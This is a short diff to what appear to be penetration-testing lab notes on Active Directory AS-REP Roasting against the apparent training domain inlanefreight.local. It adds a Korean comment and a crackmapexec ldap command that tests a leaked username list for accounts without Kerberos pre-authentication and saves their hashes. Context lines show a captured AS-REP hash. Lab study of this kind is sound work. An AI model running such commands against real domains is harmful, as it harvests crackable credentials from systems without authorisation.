@@ -138,4 +138,8 @@ $krb5asrep$23$mmorgan@inlanefreight.local@INLANEFREIGHT.LOCAL:47e0d517f2a5815da8
 [-] User jsantiago@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
 
 <SNIP>
+
+#도메인 유저가 있고 AS-REP Roasting이 가능한지만확인하고 싶을때 
+crackmapexec ldap 172.16.21.200 -u ./targets/leaked-usernames.txt -p '' --asreproast ./targets/potehtial-asrep | tee ./attacks/cme-asreproast
+
 ```
